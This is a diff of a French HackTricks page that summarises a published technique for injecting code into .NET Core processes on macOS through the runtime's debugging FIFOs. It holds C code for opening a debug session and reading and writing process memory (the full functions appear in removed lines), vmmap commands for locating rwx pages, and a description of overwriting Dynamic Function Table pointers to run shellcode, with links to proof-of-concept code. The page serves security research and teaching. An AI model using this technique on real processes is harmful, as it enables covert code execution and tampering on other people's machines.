@@ -1,204 +1,129 @@
-# Injection dans les applications .Net macOS
+# Injection d'applications .Net sur macOS
 
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert Red Team AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-Autres moyens de soutenir HackTricks :
+Autres façons de soutenir HackTricks :
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
+
+**Il s'agit d'un résumé de l'article [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Consultez-le pour plus de détails !**
 
 ## Débogage .NET Core <a href="#net-core-debugging" id="net-core-debugging"></a>
 
 ### **Établir une session de débogage** <a href="#net-core-debugging" id="net-core-debugging"></a>
 
-[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) est responsable de la gestion de la **communication** entre le débogueur et le débogué.\
-Il crée 2 pipes nommés par processus .Net dans [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) en appelant [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) (l'un se terminera par **`-in`** et l'autre par **`-out`**, et le reste du nom sera le même).
+La gestion de la communication entre le débogueur et le débogué dans .NET est gérée par [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp). Ce composant met en place deux tubes nommés par processus .NET comme vu dans [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127), qui sont initiés via [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27). Ces tubes sont suffixés par **`-in`** et **`-out`**.
 
-Ainsi, si vous allez dans le **`$TMPDIR`** de l'utilisateur, vous pourrez trouver des **fifos de débogage** que vous pourriez utiliser pour déboguer des applications .Net :
+En visitant le répertoire **`$TMPDIR`** de l'utilisateur, on peut trouver des FIFOs de débogage disponibles pour déboguer des applications .Net.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-La fonction [**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) gérera la communication depuis un débogueur.
-
-La première chose qu'un débogueur doit faire est de **créer une nouvelle session de débogage**. Cela se fait en **envoyant un message via le pipe `out`** commençant par une structure `MessageHeader`, que nous pouvons obtenir à partir de la source .NET :
+[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) est responsable de la gestion de la communication depuis un débogueur. Pour initier une nouvelle session de débogage, un débogueur doit envoyer un message via le tube `out` commençant par une structure `MessageHeader`, détaillée dans le code source .NET :
 ```c
-struct MessageHeader
-{
-MessageType   m_eType;        // Type of message this is
-DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
-DWORD         m_dwId;         // Message ID assigned by the sender of this message
-DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
-DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
-DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
-// never read)
+struct MessageHeader {
+MessageType   m_eType;        // Message type
+DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
+DWORD         m_dwId;         // Message ID from sender
+DWORD         m_dwReplyId;    // Reply-to Message ID
+DWORD         m_dwLastSeenId; // Last seen Message ID by sender
+DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
 union {
 struct {
-DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
+DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
 DWORD         m_dwMinorVersion;
 } VersionInfo;
 ...
 } TypeSpecificData;
-
-BYTE                    m_sMustBeZero[8];
+BYTE          m_sMustBeZero[8];
 }
 ```
-Dans le cas d'une demande de nouvelle session, cette structure est remplie comme suit :
+Pour demander une nouvelle session, cette structure est remplie comme suit, en définissant le type de message sur `MT_SessionRequest` et la version du protocole sur la version actuelle :
 ```c
 static const DWORD kCurrentMajorVersion = 2;
 static const DWORD kCurrentMinorVersion = 0;
 
-// Set the message type (in this case, we're establishing a session)
+// Configure the message type and version
 sSendHeader.m_eType = MT_SessionRequest;
-
-// Set the version
 sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
 sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
-
-// Finally set the number of bytes which follow this header
 sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
 ```
-Une fois construit, nous **envoyons cela à la cible** en utilisant l'appel système `write` :
+Ce titre est ensuite envoyé à la cible en utilisant l'appel système `write`, suivi de la structure `sessionRequestData` contenant un GUID pour la session :
 ```c
 write(wr, &sSendHeader, sizeof(MessageHeader));
-```
-Suivant notre en-tête, nous devons envoyer une structure `sessionRequestData`, qui contient un GUID pour identifier notre session :
-```c
-// All '9' is a GUID.. right??
 memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
-
-// Send over the session request data
 write(wr, &sDataBlock, sizeof(SessionRequestData));
 ```
-Lors de l'envoi de notre demande de session, nous **lisons à partir du tuyau `out` un en-tête** qui indiquera **si** notre demande d'établir si une session de débogage a été **réussie** ou non :
+Une opération de lecture sur le tuyau `out` confirme le succès ou l'échec de l'établissement de la session de débogage :
 ```c
 read(rd, &sReceiveHeader, sizeof(MessageHeader));
 ```
-### Lire la mémoire
-
-Avec une session de débogage établie, il est possible de **lire la mémoire** en utilisant le type de message [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). Pour lire de la mémoire, le code principal nécessaire serait :
+## Lecture de la mémoire
+Une fois qu'une session de débogage est établie, la mémoire peut être lue en utilisant le type de message [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). La fonction readMemory est détaillée, effectuant les étapes nécessaires pour envoyer une demande de lecture et récupérer la réponse :
 ```c
 bool readMemory(void *addr, int len, unsigned char **output) {
-
-*output = (unsigned char *)malloc(len);
-if (*output == NULL) {
-return false;
-}
-
-sSendHeader.m_dwId++; // We increment this for each request
-sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
-sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
-sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
-sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
-sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
-sSendHeader.m_cbDataBlock = 0;
-
-// Write the header
-if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
-return false;
-}
-
-// Read the response header
-if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
-return false;
-}
-
-// Make sure that memory could be read before we attempt to read further
-if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
-return false;
-}
-
-memset(*output, 0, len);
-
-// Read the memory from the debugee
-if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
-return false;
-}
-
+// Allocation and initialization
+...
+// Write header and read response
+...
+// Read the memory from the debuggee
+...
 return true;
 }
 ```
-Le code de la preuve de concept (POC) est disponible [ici](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).
+Le concept de preuve complet (POC) est disponible [ici](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).
 
-### Écrire en mémoire
+## Écriture en mémoire
+
+De même, la mémoire peut être écrite en utilisant la fonction `writeMemory`. Le processus implique de définir le type de message sur `MT_WriteMemory`, de spécifier l'adresse et la longueur des données, puis d'envoyer les données :
 ```c
 bool writeMemory(void *addr, int len, unsigned char *input) {
-
-sSendHeader.m_dwId++; // We increment this for each request
-sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
-sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
-sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
-sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
-sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
-sSendHeader.m_cbDataBlock = len;
-
-// Write the header
-if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
-return false;
-}
-
-// Write the data
-if (write(wr, input, len) < 0) {
-return false;
-}
-
-// Read the response header
-if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
-return false;
-}
-
-// Ensure our memory write was successful
-if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
-return false;
-}
-
+// Increment IDs, set message type, and specify memory location
+...
+// Write header and data, then read the response
+...
+// Confirm memory write was successful
+...
 return true;
-
 }
 ```
-Le code POC utilisé pour cela peut être trouvé [ici](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).
+Le POC associé est disponible [ici](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).
 
-### Exécution de code .NET Core <a href="#net-core-code-execution" id="net-core-code-execution"></a>
+## Exécution de code .NET Core <a href="#net-core-code-execution" id="net-core-code-execution"></a>
 
-La première chose est d'identifier par exemple une région de mémoire avec **`rwx`** en cours d'exécution pour sauvegarder le shellcode à exécuter. Cela peut être facilement réalisé avec :
+Pour exécuter du code, il est nécessaire d'identifier une région mémoire avec des permissions rwx, ce qui peut être fait en utilisant vmmap -pages:
 ```bash
 vmmap -pages [pid]
 vmmap -pages 35829 | grep "rwx/rwx"
 ```
-```markdown
-Ensuite, pour déclencher l'exécution, il serait nécessaire de connaître un endroit où un pointeur de fonction est stocké pour l'écraser. Il est possible d'écraser un pointeur dans la **Table de Fonctions Dynamiques (DFT)**, qui est utilisée par l'exécution de .NET Core pour fournir des fonctions d'assistance pour la compilation JIT. Une liste des pointeurs de fonction pris en charge peut être trouvée dans [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h).
+Localiser un endroit pour écraser un pointeur de fonction est nécessaire, et dans .NET Core, cela peut être fait en ciblant la **Table de Fonctions Dynamiques (DFT)**. Cette table, détaillée dans [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h), est utilisée par le runtime pour les fonctions d'aide à la compilation JIT.
 
-Dans les versions x64, cela est simple en utilisant la technique de **signature hunting** à la manière de mimikatz pour rechercher dans **`libcorclr.dll`** une référence au symbole **`_hlpDynamicFuncTable`**, que nous pouvons déréférencer :
+Pour les systèmes x64, la chasse aux signatures peut être utilisée pour trouver une référence au symbole `_hlpDynamicFuncTable` dans `libcorclr.dll`.
 
-<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+La fonction de débogage `MT_GetDCB` fournit des informations utiles, y compris l'adresse d'une fonction d'aide, `m_helperRemoteStartAddr`, indiquant l'emplacement de `libcorclr.dll` dans la mémoire du processus. Cette adresse est ensuite utilisée pour démarrer une recherche de la DFT et écraser un pointeur de fonction avec l'adresse du shellcode.
 
-Il ne reste plus qu'à trouver une adresse à partir de laquelle commencer notre recherche de signature. Pour ce faire, nous utilisons une autre fonction de débogage exposée, **`MT_GetDCB`**. Cela retourne un certain nombre d'informations utiles sur le processus cible, mais dans notre cas, nous sommes intéressés par un champ retourné contenant **l'adresse d'une fonction d'assistance**, **`m_helperRemoteStartAddr`**. En utilisant cette adresse, nous savons juste **où `libcorclr.dll` est situé** dans la mémoire du processus cible et nous pouvons commencer notre recherche de la DFT.
-
-Connaissant cette adresse, il est possible d'écraser le pointeur de fonction avec celui de nos shellcodes.
-
-Le code POC complet utilisé pour l'injection dans PowerShell peut être trouvé [ici](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).
+Le code POC complet pour l'injection dans PowerShell est accessible [ici](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).
 
 ## Références
 
-* Cette technique a été prise de [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
+* [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
 
 <details>
 
-<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Autres moyens de soutenir HackTricks :
+Autres façons de soutenir HackTricks:
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
-* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
+* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez** 💬 le **groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
-```
